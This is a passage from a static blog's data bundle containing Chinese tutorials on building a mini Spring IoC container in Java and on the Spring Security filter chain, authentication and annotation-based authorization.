com.itcast.ioc.bean.teacher getteacher() {\n        return teacher;\n    }\n    public void setteacher(com.itcast.ioc.bean.teacher teacher) {\n        this.teacher = teacher;\n    }\n}\n/**\n * 教师类\n **/\npublic class teacher {\n    private string tname;// 老师名称\n    public string gettname() {\n        return tname;\n    }\n    public void settname(string tname) {\n        this.tname = tname;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\nxml配置对象\n\n配置学生对象: 小明\n\n依赖班级对象: 3年2班\n\n依赖教师对象: 陈老师\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans>\n    \x3c!-- 配置ioc容器要管理的对象   bean作用域: 单例  原型 --\x3e\n    <bean id="student" class="com.itcast.ioc.bean.student" scope="singleton"\n          lazy-init="true">\n        \x3c!-- 依赖注入:   属性注入    构造器注入   注解注入--\x3e\n        <property name="name" value="小明"></property>\n        <property name="tclass" ref="tclass"></property>\n    </bean>\n    <bean id="tclass" class="com.itcast.ioc.bean.tclass">\n        <property name="cname" value="3年2班"></property>\n        <property name="teacher" ref="teacher"></property>\n    </bean>\n    <bean id="teacher" class="com.itcast.ioc.bean.teacher">\n        <property name="tname" value="陈老师"></property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# mini-ioc容器-定义类\n\n定义beanfactory\n\n/**\n * 容器的基础接口\n * 提供容器最基本的功能\n */\npublic interface beanfactory {\n    // 核心方法 获取对象\n    object getbean(string beanname);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n定义defaultlistablebeanfactory\n\npackage com.itcast.ioc.core;\n\nimport java.util.map;\nimport java.util.concurrent.concurrenthashmap;\n\n/**\n * 基础容器的核心实现\n * 提供 beandefinitionmap 存储bean的定义\n * 提供 singletonobjects 存储bean的对象实例\n **/\npublic class defaultlistablebeanfactory implements beanfactory {\n    // 提供 beandefinitionmap 存储bean的定义\n    private map<string,beandefinition> beandefinitionmap = new concurrenthashmap<>();\n    // 提供 singletonobjects 存储bean的对象实例 (scope为singleton的)\n    private map<string,object> singletonobjects = new concurrenthashmap<>();\n    /**\n     * 实现getbean方法\n     * @param beanname\n     * @return\n     */\n    @override\n    public object getbean(string beanname) {\n        return null;\n    }\n    /**\n     * 将bean注册到容器中\n     * @param beandefinition\n     */\n    public void registerbeandefinition(beandefinition beandefinition){\n        beandefinitionmap.put(beandefinition.getbeanname(),beandefinition);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n定义beandefnition\n\n/**\n * 用于描述bean的定义\n **/\npublic class beandefinition {\n    private string beanname; // bean标签的id 作为bean的唯一标识\n    private string classname; // bean的所属class\n    private string scope = "singleton";  // bean的scope作用域\n    private list<property> propertylist = new arraylist<>();\n    public string getbeanname() {\n        return beanname;\n    }\n    public void setbeanname(string beanname) {\n        this.beanname = beanname;\n    }\n    public string getclassname() {\n        return classname;\n    }\n    public void setclassname(string classname) {\n        this.classname = classname;\n    }\n    public string getscope() {\n        return scope;\n    }\n    public void setscope(string scope) {\n        this.scope = scope;\n    }\n    public list<property> getpropertylist() {\n        return propertylist;\n    }\n    public void setpropertylist(list<property> propertylist) {\n        this.propertylist = propertylist;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n定义property\n\n/**\n * 用于封装一个property标签\n * 属性数据\n **/\npublic class property {\n    private string name; // 属性名称\n    private string value; // 属性的值\n    private string ref; // 属性的引用\n    public string getname() {\n        return name;\n    }\n    public void setname(string name) {\n        this.name = name;\n    }\n    public string getvalue() {\n        return value;\n    }\n    public void setvalue(string value) {\n        this.value = value;\n    }\n    public string getref() {\n        return ref;\n    }\n    public void setref(string ref) {\n        this.ref = ref;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n定义xmlbeanfactory\n\n/**\n * 继承核心实现类\n * 基于xml配置bean的实现类\n **/\npublic class xmlbeanfactory extends defaultlistablebeanfactory {\n    /**\n     * 将解析配置文件 注册bean的所有工作交给reader对象\n     */\n    final xmlbeandefinitionreader xmlbeandefinitionreader = new xmlbeandefinitionreader(this);\n    /**\n     * 构造器需要传入xml配置文件\n     * @param configpath\n     */\n    public xmlbeanfactory(string configpath) {\n        // 使用reader对象 解析配置  注册bean\n        this.xmlbeandefinitionreader.loadbeandefinitions(configpath);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n定义xmlbeandefinitionreader\n\n/**\n * 解析配置\n * 注册到容器中\n **/\npublic class xmlbeandefinitionreader {\n    // 核心beanfactory对象 用于将解析后的bean注册到beanfactory中\n    final defaultlistablebeanfactory beanfactory;\n    public xmlbeandefinitionreader(defaultlistablebeanfactory beanfactory) {\n        this.beanfactory = beanfactory;\n    }\n    /**\n     * 根据传递的配置文件\n     * 解析配置\n     * 注册bean\n     * @param configpath\n     */\n    void loadbeandefinitions(string configpath){\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# mini-ioc容器--解析注册\n\n实现步骤\n\n 1. 通过dom4j解析xml得到document文档\n\n 2. 遍历文档所有bean标签\n\n 3. 解析每一个bean标签 封装一个beandefinition对象\n\n 4. 解析每一个bean标签下的所有property标签 封装一个property对象\n\n 5. 将beandefinition和property对象注册到容器\n\n实现xml解析及bean注册\n\n/**\n * 解析配置\n * 注册到容器中\n **/\npublic class xmlbeandefinitionreader {\n    // 核心beanfactory对象 用于将解析后的bean注册到beanfactory中\n    final defaultlistablebeanfactory beanfactory;\n    public xmlbeandefinitionreader(defaultlistablebeanfactory beanfactory) {\n        this.beanfactory = beanfactory;\n    }\n    /**\n     * 根据传递的配置文件\n     * 解析配置\n     * 注册bean\n     * @param configpath\n     */\n    void loadbeandefinitions(string configpath){\n        // 1. 通过dom4j解析xml得到document文档\n        document document = doloaddocument(configpath);\n        // 2. 遍历文档所有bean标签\n        element rootelement = document.getrootelement();\n        list<element> list = rootelement.selectnodes("//bean");\n        for (element element : list) {\n            // 3. 解析每一个bean标签 封装一个beandefinition对象\n            beandefinition beandefinition = parsebeandefinition(element);\n            // 5. 将beandefinition和property对象注册到容器\n            beanfactory.registerbeandefinition(beandefinition);\n        }\n    }\n    /**\n     * 3. 解析每一个bean标签 封装一个beandefinition对象\n     * 4. 解析每一个bean标签下的所有property标签 封装一个property对象\n     */\n    beandefinition parsebeandefinition(element element){\n        beandefinition beandefinition = new beandefinition();\n        string beanname = element.attributevalue("id");\n        string classname = element.attributevalue("class");\n        string scope = element.attributevalue("scope");\n        beandefinition.setbeanname(beanname);\n        beandefinition.setclassname(classname);\n        if(scope!=null&&!"".equals(scope)){\n            beandefinition.setscope(scope);\n        }\n        list<element> propertylist = element.elements("property");\n        for (element propertyele : propertylist) {\n            property property = new property();\n            property.setname(propertyele.attributevalue("name"));\n            property.setvalue(propertyele.attributevalue("value"));\n            property.setref(propertyele.attributevalue("ref"));\n            beandefinition.getpropertylist().add(property);\n        }\n        return beandefinition;\n    }\n    /**\n     * 解析document文档\n     * @param configpath\n     * @return\n     */\n    document doloaddocument(string configpath){\n        inputstream inputstream = this.getclass().getclassloader().getresourceasstream(configpath);\n        saxreader saxreader = new saxreader();\n        try {\n            return saxreader.read(inputstream);\n        } catch (documentexception e) {\n            e.printstacktrace();\n            system.out.println("解析xml出现异常==>"+e.getmessage());\n            throw new runtimeexception(e.getmessage());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n准备测试类\n\n/**\n * 测试类\n **/\npublic class ioctest {\n    public static void main(string[] args) {\n        // 创建ioc容器\n        beanfactory beanfactory = new xmlbeanfactory("applicationcontext.xml");\n        // 通过容器获取对象\n        student student = (student)beanfactory.getbean("student");\n        // 调用对象sayhello方法\n        student.sayhello();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n断点查看注册情况\n\n可以看到我们配置的xml内容 已经解析成了beandefinition对象，注册到了核心容器的map中\n\n\n\n\n# mini-ioc容器-getbean\n\n实现步骤\n\n 1. 先从单例的map集合中获取 是否有指定beanname的对象\n\n·有直接返回\n\n·没有下一步\n\n 2. 从注册集合中获取bean的定义对象\n\n·有下一步\n\n·没有抛异常nosuchbeandefinition\n\n 3. 判断bean的scope作用域\n\nsingleton单例\n\n· createbean对象\n\n·存入单例集合\n\n·返回对象\n\nprototype多例\n\n·createbean对象\n\n·返回对象\n\n 4. createbean方法\n\n获取beandefinition中的classname\n\n通过反射api得到class对象\n\n通过反射api得到bean实例\n\n获取beandefinition中依赖的属性列表\n\n实现属性的依赖注入\n\n实现getbean及createbean方法\n\n/**\n * 基础容器的核心实现\n * 提供 beandefinitionmap 存储bean的定义\n * 提供 singletonobjects 存储bean的对象实例\n **/\npublic class defaultlistablebeanfactory implements beanfactory {\n    // 提供 beandefinitionmap 存储bean的定义\n    private map<string,beandefinition> beandefinitionmap = new concurrenthashmap<>();\n    // 提供 singletonobjects 存储bean的对象实例 (scope为singleton的)\n    private map<string,object> singletonobjects = new concurrenthashmap<>();\n    /**\n     * 实现getbean方法\n     * @param beanname\n     * @return\n     */\n    @override\n    public object getbean(string beanname) {\n//        1. 先从单例的map集合中获取 是否有指定beanname的对象\n        object singletonobj = singletonobjects.get(beanname);\n//                有直接返回\n        if(singletonobj!=null){\n            return singletonobj;\n        }\n//                没有下一步\n//        2. 从注册集合中获取bean的定义对象\n        beandefinition beandefinition = beandefinitionmap.get(beanname);\n//                有下一步\n//        没有抛异常nosuchbeandefinition\n        if(beandefinition==null){\n            throw new runtimeexception("nosuchbeandefinition : 你找的 "+beanname+" 对象 不存在");\n        }\n//        3. 判断bean的scope作用域\n        string scope = beandefinition.getscope();\n//                singleton单例\n        if("singleton".equals(scope)){\n//        createbean对象\n            object obj = createbean(beandefinition);\n//        存入单例集合\n            singletonobjects.put(beanname,obj);\n//        返回对象\n            return obj;\n        }else {\n//        prototype多例\n//        createbean对象\n            return createbean(beandefinition);\n//        返回对象\n        }\n    }\n    /**\n     * //4. createbean方法\n     * //获取beandefinition中的classname\n     * //通过反射api得到class对象\n     * //通过反射api得到bean实例\n     * //获取beandefinition中依赖的属性列表\n     * //实现属性的依赖注入\n     * 创建对象\n     * @param beandefinition\n     * @return\n     */\n    object createbean(beandefinition beandefinition){\n        string classname = beandefinition.getclassname();\n        class<?> aclass;\n        try {\n            aclass = class.forname(classname);\n        } catch (classnotfoundexception e) {\n            e.printstacktrace();\n            throw new runtimeexception("类未找到"+e.getmessage());\n        }\n        // 创建对象:\n        object obj;\n        try {\n            obj = aclass.newinstance();\n        } catch (instantiationexception e) {\n            e.printstacktrace();\n            throw new runtimeexception("创建对象失败"+e.getmessage());\n        } catch (illegalaccessexception e) {\n            e.printstacktrace();\n            throw new runtimeexception("非法访问"+e.getmessage());\n        }\n        // 依赖注入\n        list<property> propertylist = beandefinition.getpropertylist();\n        for (property property : propertylist) {\n            string name = property.getname();\n            string value = property.getvalue();\n            string ref = property.getref();\n            // 属性名不为空 进行注入\n            if(name!=null&&!"".equals(name)){\n                // 如果配置的是value值 直接注入\n                if(value!=null&&!"".equals(value)){\n                    map<string,string> params = new hashmap<>();\n                    params.put(name,value);\n                    try {\n                        beanutils.populate(obj,params);\n                    } catch (illegalaccessexception e) {\n                        e.printstacktrace();\n                        throw new runtimeexception("非法访问"+e.getmessage());\n                    } catch (invocationtargetexception e) {\n                        e.printstacktrace();\n                        throw new runtimeexception("调用目标对象失败"+e.getmessage());\n                    }\n                }\n                // 如果配置的是ref需要获取其它对象注入\n                if(ref!=null&&!"".equals(ref)){\n                    try {\n                        beanutils.setproperty(obj,name,getbean(ref));\n                    } catch (illegalaccessexception e) {\n                        e.printstacktrace();\n                        throw new runtimeexception("非法访问"+e.getmessage());\n                    } catch (invocationtargetexception e) {\n                        e.printstacktrace();\n                        throw new runtimeexception("调用目标对象失败"+e.getmessage());\n                    }\n                }\n            }\n        }\n        return obj;\n    }\n    /**\n     * 将bean注册到容器中\n     * @param beandefinition\n     */\n    public void registerbeandefinition(beandefinition beandefinition){\n        beandefinitionmap.put(beandefinition.getbeanname(),beandefinition);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n\n\n\n# mini-ioc容器-单例对象初始化\n\ndefaultlistablebeanfactory增加初始化方法\n\npublic void preinstanicesingletons(){\n        beandefinitionmap.foreach((beanname,beandefinition)->{\n            string scope = beandefinition.getscope();\n            // 判断单例  非抽象   不懒加载\n            if("singleton".equals(scope)){\n                this.getbean(beanname);\n            }\n        });\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nxmlbeanfactory增加单例对象初始化\n\npublic xmlbeanfactory(string configpath) {\n   // 使用reader对象 解析配置  注册bean\n   this.xmlbeandefinitionreader.loadbeandefinitions(configpath);\n   // 初始化单例对象\n   this.preinstanicesingletons();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# mini-ioc容器-测试和小结\n\n测试对象能否获取\n\npublic class ioctest {\n    public static void main(stiring[] args) {\n        beanfactory beanfactory = new xmlbeanfactory("applicationcontext.xml");\n        student student = (student) beanfactory.getbean("student");\n        student.sayhello();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n查看bean的注册及单例集合信息\n\n可以通过变更scope的值查看对应的变化\n\n\n\n\n# ioc容器源码及其它面试细节\n\n\n# 扩展: 容器如何创建对象\n\nioc容器在准备创建对象时， 会判断是否有配置 factory-method方法\n\n如果有配置 会调用factory-method所指向的方法构建对象.\n\n如果没配置，会检查是否有配置构造参数\n\n无构造参数: 调用默认构造器创建对象\n\n有构造参数: 根据参数情况匹配对应的构造器\n\n\n# 扩展: bean的生命周期\n\nspring 容器中的bean的完整生命周期一共分为十一步完成。\n\n1.bean对象的实例化\n\n2.封装属性，也就是设置properties中的属性值\n\n3.如果bean实现了beannameaware，则执行setbeanname方法,也就是bean中的id值\n\n4.如果实现beanfactoryaware或者applicationcontextaware ，需要设置setbeanfactory或者上下文对象setapplicationcontext\n\n5.如果存在类实现beanpostprocessor后处理bean，执行postprocessbeforeinitialization，可以在初始化之前执行一些方法\n\n6.如果bean实现了initializingbean，则执行afterpropertiesset，执行属性设置之后的操作\n\n7.调用执行指定的初始化方法\n\n8.如果存在类实现beanpostprocessor则执行postprocessafterinitialization，执行初始化之后的操作\n\n9.执行自身的业务方法\n\n10.如果bean实现了disposablebean，则执行spring的的销毁方法\n\n11.调用执行自定义的销毁方法。\n\n\n# 扩展: bean的循环依赖问题\n\na 依赖 b b 依赖 a 产生闭环，称为循环依赖\n\n·spring 默认允许单例对象的属性注入 所产生的循环依赖\n\n单例对象的循环依赖 spring通过3级缓存来解决\n\n比如一个类a中有一个属性是b类，b类中有一个属性是a类，这时看spring是怎么解决他们的相互依赖的。spring注入一个类的大体步骤分为两部分，一是先完成对类的构造工作，二是会对类的属性进行设置和填充。首先spring构造a类，通过abstractautowirecapablebeanfactory的docreatebean方法中调用addsingletonfactory方法将a类曝光到singletonfactories中。这时完成a的构造后，需要填充b属性，继续第二步，发现b还没有构造，于是开始b流程的构造过程，构造的时候发现需要填充a，从第三层缓存singletonfactories中找到a(此时的a还没有完全构造完成，但是可以拿到a的一个引用)，b拿到a的引用后，完成b自己的填充属性工作，完成初始化工作，把自己放到第一层缓存singletonobjects中。这时回到a的这边，在拿到b对象后，完成自己的填充属性工作。\n\n源码                      级别     描述\nsingletonobjects        一级缓存   用于存放完全初始化好的 bean，从该缓存中取出的 bean 可以直接使用\nearlysingletonobjects   二级缓存   存放原始的 bean 对象（尚未填充属性），用于解决循环依赖\nsingletonfactories      三级缓存   存放 bean 工厂对象，用于解决循环依赖·如果是构造器依赖属性 会报循环依赖异常\n\n·如果对象都是多例对象 会报循环依赖异常\n\n·如果设置allowcircularreferences为false 会报循环依赖异常\n\nprotected void customizebeanfactory(defaultlistablebeanfactory beanfactory) {\n   if (this.allowbeandefinitionoverriding != null) {\n      beanfactory.setallowbeandefinitionoverriding(this.allowbeandefinitionoverriding);\n   }\n   if (this.allowcircularreferences != null) {\n      beanfactory.setallowcircularreferences(this.allowcircularreferences);\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 扩展: bean的覆盖问题\n\n默认情况:\n\n同一个配置文件中出现id相同的bean会报错，不同的配置文件出现id相同的bean后加，载的bean会将先加载的bean覆盖掉称为bean的覆盖，bean的覆盖不会报错，但可能影响我们的项目，可以通过属性设置不允许bean的覆盖，allowbeandefinitionoverriding设置为false。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Spring Security 认证授权",frontmatter:{title:"Spring Security 认证授权",date:"2022-12-19T00:00:00.000Z",tags:["分布式","Spring Security"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-security-02.html",relativePath:"views/backend/spring-security-02.md",key:"v-796c88ea",path:"/views/backend/spring-security-02.html",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:3},{level:2,title:"认证",slug:"认证",normalizedTitle:"认证",charIndex:9},{level:2,title:"授权",slug:"授权",normalizedTitle:"授权",charIndex:15},{level:3,title:"基于注解的鉴权",slug:"基于注解的鉴权",normalizedTitle:"基于注解的鉴权",charIndex:23},{level:3,title:"基于url的动态鉴权",slug:"基于url的动态鉴权",normalizedTitle:"基于url的动态鉴权",charIndex:36},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:50}],excerpt:"<Boxx/>\n",headersStr:"简介 认证 授权 基于注解的鉴权 基于url的动态鉴权 参考",content:' * 简介\n * 认证\n * 授权\n   * 基于注解的鉴权\n   * 基于url的动态鉴权\n * 参考\n\n\n\n\n# 简介\n\n在 Spring Boot 风靡的今天，一款强大的安全管理框架必不可少，作为 Spring Boot 项目首选的默认安全技术选型，对 Spring Security 的学习必不可少，其实主要包括 认证 和 授权 两部分。\n\n而 Spring Security 的底层原理其实也就是一个 过滤器链，通过一个过滤器链中的不同过滤器组件实现不同的安全功能。\n\n\n\n过滤器链中的前三个部分都是可配置的，我们也可以在指定过滤器之前或之后添加我们自定义的过滤器。而 ExceptionTranslationFilter 和 FilterSecurityInterceptor 是一定会执行的。\n\nSpring Security 默认的过滤器：\n\n序号   过滤器                                       描述\n1    SecurityContextPersistenceFilter          首当其冲的一个过滤器，非常重要，主要是使用SecurityContextRepository在session中保存或更新一个SecurityContext，并将SecurityContext给以后的过滤器使用，来为后续filter建立所需的上下文，SecurityContext中存储了当前用户的认证和权限信息。\n2    WebAsyncManagerIntegrationFilter          此过滤器用于继承SecurityContext到Spring异步执行机制中的WebAsyncManager，和spring整合必须的。\n3    HeaderWriterFilter                        向请求的header中添加响应的信息，可以在http标签内部使用 security:headers 来控制。\n4    CsrfFilter                                Csrf又称跨域请求伪造，SpringSecurity会对所有post请求验证是否包含系统生成的csrf的token信息，如果不包含则报错，起到防止csrf攻击的效果。\n5    LogoutFilter                              匹配URL为/logout的请求，实现用户退出，清楚认证信息。\n6    UsernamePasswordAuthenticationFilter      认证操作全靠这个过滤器，默认匹配URL为/login且必须为POST请求。\n7    DefaultLoginPageGeneratingFilter          如果没有在配置文件中指定认证页面，则由该过滤器生成一个默认的认证界面。\n8    DefaultLogoutPageGeneratingFilter         由此过滤器生成一个默认的退出登录页面。\n9    BasicAuthenticationFilter                 此过滤器会自动解析HTTP请求中头部名字为Authentication，且以Basic开头的头部信息。\n10   RequestCacheAwareFilter                   通过HttpSessionRequestCache内部维护一个RequestCache，用于缓存HttpServletRequest。\n11   SecurityContextHolderAwareRequestFilter   针对ServletRequest进行一次包装，使得request具有更加丰富的API。\n12   AnonymousAuthenticationFilter             当SecurityContextHolder中认证信息为空，则会创建一个匿名用户存储到SecurityContextHolder中，SpringSecurity为了兼容未登录的访问，也走了一套认证流程，只不过是一个匿名的身份。\n13   SessionManagementFilter                   SecurityContextRepository限制同一个用户开启多个会话的数量。\n14   ExceptionTranslationFilter                异常转换过滤器位于整个SpringSecurityFilterChain的后方，用来转换整个链路中出现的异常。\n15   FilterSecurityInterceptor                 获取所有配置资源的访问授权信息，根据SecurityContextHolder中存储的用户信息来决定其是否有权限。\n\nSpring 虽提供了拦截器，但 Spring Security 使用过滤器实现的主要原因是因为：过滤器是 servlet 层面的，而拦截器是 spring 层面的。一个请求进来的时候会依次经过：Filter -> Servlet -> Inteceptor -> Controller，若用 Inteceptor（拦截器）实现的话，可能一些请求已经被 Filter（过滤器） 过滤掉了导致Inteceptor（拦截器）无法处理。所以 Filter（过滤器）作为请求的入口，安全框架应该从 Filter（过滤器） 入手。\n\n\n# 认证\n\n认证流程：\n\n 1. 请求进来后先经过 用户名密码认证过滤器（这个在使用JWT的情况下会被我们自己实现的 JwtAuthenticationTokenFilter 代替），只要用户的请求满足该过滤器的条件，即认证成功（这些都是我们后续在代码中自己实现）。如果不满足则放行给下一个；\n\n 2. 请求继续向后，经过 BasicAutenticationFilter 继续进行认证，直到最后 FilterSecurityInterceptor 拦截器，它是API的最后一环，由它来决定请求是否能到达具体的API。简单来说，就是负责权限校验（利用 SecurityContextHolder 来获取用户的权限相关信息）;\n    \n    1. 它会根据我们配置的一些要求，来进行判断，如果不通过则抛出异常\n    \n    2. 例如某API要求请求必须经过认证，则在最后一个拦截器处，请求如果没有进行认证，则抛出对应的异常\n    \n    3. 比如某API要求请求具有VIP的权限，则最后一个拦截器会判断该请求是否具有VIP权限\n\n 3. ExceptionTranslationFilter 的作用主要是捕获 FilterSecurityInterceptor 抛出的异常( AccessDeniedException 和 AuthenticationException )，并做响应的处理\n\n 4. 黄色的部分可以通过配置来决定是否存在于过滤器链上，即由我们来决定使用哪些认证方式\n\n\n\n\n# 授权\n\n\n# 基于注解的鉴权\n\n基于方法的权限管理主要是通过AOP来实现的，spring security 中通过 MethodSecurityInterceptor 来提供相关的实现。不同在于，FilterSecurityInterceptor 只是在请求之前进行前置处理，MethodSecurityInterceptor 在此基础上还可以进行后置处理。前置处理就是在请求之前判断是否具备相应的权限，后置处理则是对方法的执行结果进行二次过滤。\n\n 1. 通过@EnableGlobalMethodSecurity(prePostEnabled = true)注解开启权限注解的使用\n\n 2. @PreAuthorize\n    \n    @Service\n    public class HelloService {\n    \t// 执行该方法必须具备ADMIN角色才可以访问\n        @PreAuthorize("hasRole(\'ADMIN\')")\n        public String preAuthorizeTest01() {\n            return "Hello";\n        }\n        // 访问者名称必须是javaboy，而且还需要同事具备ADMIN角色才可以访问\n        @PreAuthorize("hasRole(\'ADMIN\') and authentication.name == \'javaboy\'")\n        public String preAuthorizeTest02() {\n            return "Hello";\n        }\n        // 通过#引用方法参数，并对其进行校验，表示请求者的用户名必须等于方法参数name的值，方法才可以被执行\n        @PreAuthorize("authentication.name == #name")\n        public String preAuthorizeTest03(String name) {\n            return "Hello: " + name;\n        }\n    }\n    \n    @SpringBootTest\n    class BasedOnMethodApplicationTests {\n    \t@Autowired\n        HelloService helloService;\n        @Test\n        // 通过该注解设定当前执行的用户角色是ADMIN\n        @WithMockUser(roles = "ADMIN")\n        void preAuthorizeTest01() {\n            String hello = helloService.preAuthorizeTest01();\n            Assertions.assertNotNull(hello);\n            Assertions.assertEquals("Hello", hello);\n        }\n        @Test\n        @WithMockUser(roles = "ADMIN", username = "javaboy")\n        void preAuthorizeTest02() {\n            String hello = helloService.preAuthorizeTest02();\n            Assertions.assertNotNull(hello);\n            Assertions.assertEquals("Hello", hello);\n        }\n        @Test\n        @WithMockUser(username = "javaboy")\n        void preAuthorizeTest03() {\n            String hello = helloService.preAuthorizeTest03("javaboy");\n            Assertions.assertNotNull(hello);\n            Assertions.assertEquals("Hello: javaboy", hello);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    \n\n\n# 基于url的动态鉴权\n\n鉴权主要在 FilterSecurityInterceptor 这个类，如果默认的 FilterSecurityInterceptor 不满足要求，那我们就重写它就好了。\n\n 1. 实现 FilterInvocationSecurityMetadataSource.getAttributes 提供一个 url 对应的所需权限集合\n 2. 实现 AccessDecisionManager.decide 将当前登录用户的权限和 url 的所需权限比对，有则鉴权通过\n\n代码已经完成，实例可参考项目：https://github.com/zpj80231/imall admin 模块\n\n\n# 参考\n\n * Spring Security 认证与授权流程\n * Spring Security 基本认证，授权流程，原理方法\n * Spring Security 权限管理',normalizedContent:' * 简介\n * 认证\n * 授权\n   * 基于注解的鉴权\n   * 基于url的动态鉴权\n * 参考\n\n\n\n\n# 简介\n\n在 spring boot 风靡的今天，一款强大的安全管理框架必不可少，作为 spring boot 项目首选的默认安全技术选型，对 spring security 的学习必不可少，其实主要包括 认证 和 授权 两部分。\n\n而 spring security 的底层原理其实也就是一个 过滤器链，通过一个过滤器链中的不同过滤器组件实现不同的安全功能。\n\n\n\n过滤器链中的前三个部分都是可配置的，我们也可以在指定过滤器之前或之后添加我们自定义的过滤器。而 exceptiontranslationfilter 和 filtersecurityinterceptor 是一定会执行的。\n\nspring security 默认的过滤器：\n\n序号   过滤器                                       描述\n1    securitycontextpersistencefilter          首当其冲的一个过滤器，非常重要，主要是使用securitycontextrepository在session中保存或更新一个securitycontext，并将securitycontext给以后的过滤器使用，来为后续filter建立所需的上下文，securitycontext中存储了当前用户的认证和权限信息。\n2    webasyncmanagerintegrationfilter          此过滤器用于继承securitycontext到spring异步执行机制中的webasyncmanager，和spring整合必须的。\n3    headerwriterfilter                        向请求的header中添加响应的信息，可以在http标签内部使用 security:headers 来控制。\n4    csrffilter                                csrf又称跨域请求伪造，springsecurity会对所有post请求验证是否包含系统生成的csrf的token信息，如果不包含则报错，起到防止csrf攻击的效果。\n5    logoutfilter                              匹配url为/logout的请求，实现用户退出，清楚认证信息。\n6    usernamepasswordauthenticationfilter      认证操作全靠这个过滤器，默认匹配url为/login且必须为post请求。\n7    defaultloginpagegeneratingfilter          如果没有在配置文件中指定认证页面，则由该过滤器生成一个默认的认证界面。\n8    defaultlogoutpagegeneratingfilter         由此过滤器生成一个默认的退出登录页面。\n9    basicauthenticationfilter                 此过滤器会自动解析http请求中头部名字为authentication，且以basic开头的头部信息。\n10   requestcacheawarefilter                   通过httpsessionrequestcache内部维护一个requestcache，用于缓存httpservletrequest。\n11   securitycontextholderawarerequestfilter   针对servletrequest进行一次包装，使得request具有更加丰富的api。\n12   anonymousauthenticationfilter             当securitycontextholder中认证信息为空，则会创建一个匿名用户存储到securitycontextholder中，springsecurity为了兼容未登录的访问，也走了一套认证流程，只不过是一个匿名的身份。\n13   sessionmanagementfilter                   securitycontextrepository限制同一个用户开启多个会话的数量。\n14   exceptiontranslationfilter                异常转换过滤器位于整个springsecurityfilterchain的后方，用来转换整个链路中出现的异常。\n15   filtersecurityinterceptor                 获取所有配置资源的访问授权信息，根据securitycontextholder中存储的用户信息来决定其是否有权限。\n\nspring 虽提供了拦截器，但 spring security 使用过滤器实现的主要原因是因为：过滤器是 servlet 层面的，而拦截器是 spring 层面的。一个请求进来的时候会依次经过：filter -> servlet -> inteceptor -> controller，若用 inteceptor（拦截器）实现的话，可能一些请求已经被 filter（过滤器） 过滤掉了导致inteceptor（拦截器）无法处理。所以 filter（过滤器）作为请求的入口，安全框架应该从 filter（过滤器） 入手。\n\n\n# 认证\n\n认证流程：\n\n 1. 请求进来后先经过 用户名密码认证过滤器（这个在使用jwt的情况下会被我们自己实现的 jwtauthenticationtokenfilter 代替），只要用户的请求满足该过滤器的条件，即认证成功（这些都是我们后续在代码中自己实现）。如果不满足则放行给下一个；\n\n 